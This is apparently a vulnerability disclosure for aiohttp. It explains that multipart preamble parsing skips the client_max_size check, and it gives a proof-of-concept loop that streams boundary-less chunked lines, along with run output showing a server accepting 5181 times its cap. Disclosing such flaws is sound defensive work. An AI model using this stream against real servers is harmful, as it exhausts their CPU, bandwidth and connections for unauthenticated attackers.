## Description

`Request.post()`'s `client_max_size` enforcement only happens **after** `multipart.next()` returns a field — all checks (`if 0 < max_size < payload.total_bytes`) are inside the `while (field := await multipart.next()) is not None:` loop (`aiohttp/web_request.py`).

But `next()` first runs `_read_until_first_boundary()` (`aiohttp/multipart.py`), which loops `chunk = await self._readline()` consuming the preamble until the opening boundary appears — with **no size budget check at all** in that loop. A body that never contains the declared opening boundary is therefore consumed indefinitely, completely bypassing `client_max_size`.

## Impact

Unauthenticated remote CPU/bandwidth/connection-pool exhaustion against any aiohttp server exposing a form endpoint: unlike a normal oversized upload (rejected with 413), an unlimited stream of boundary-mismatched lines is consumed forever with no backpressure, keeping the connection and the parse loop busy. THREAT_MODEL.md §5.4 (4.2) currently states "client_max_size caps the wire bytes" — this path is an exception to that claim.

## PoC

Verified on current master snapshot (pure-Python backend; the multipart reader is Python-side and identical under the Cython parser). Victim server:

```python
app = web.Application(client_max_size=1024)      # demo cap; default 1 MiB behaves the same
async def form(request):
    data = await request.post()
    return web.json_response({"fields": len(data)})
app.router.add_post("/form", form)
```

Control (normal oversized multipart, proper opening boundary) vs attack (declared boundary never appears):

```python
# control body: b"--BOUND\r\n...8 KiB field...\r\n--BOUND--\r\n"  -> expect 413

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)
# attack: chunked stream of 65500-byte lines that never match --BOUND
line = b"A" * 65500 + b"\r\n"
while sent < 5 * 1024 * 1024:
    s.sendall(b"%x\r\n" % len(line) + line + b"\r\n")
```

## Execution result

```
[control] oversized normal multipart -> b'HTTP/1.1 413 Request Entity Too Large'
[attack] sent 1087 KiB ... no 413 so far
[attack] sent 2111 KiB ... no 413 so far
[attack] sent 3134 KiB ... no 413 so far
[attack] sent 4158 KiB ... no 413 so far
[attack] sent 5181 KiB ... no 413 so far
[attack] total sent 5306310 bytes (5181 KiB = 5181x cap), server responded: b'', connection alive: True
[RESULT] {"client_max_size": 1024, "control_oversized_multipart_rejected_413": true,
          "attack_bytes_sent_without_rejection": 5306310,
          "attack_multiplier_over_cap": 5181, "attack_connection_still_open": true,
          "verdict": "REPRODUCED"}
```

5181× the configured cap was streamed with zero rejection while the equivalent normal upload was 413'd.
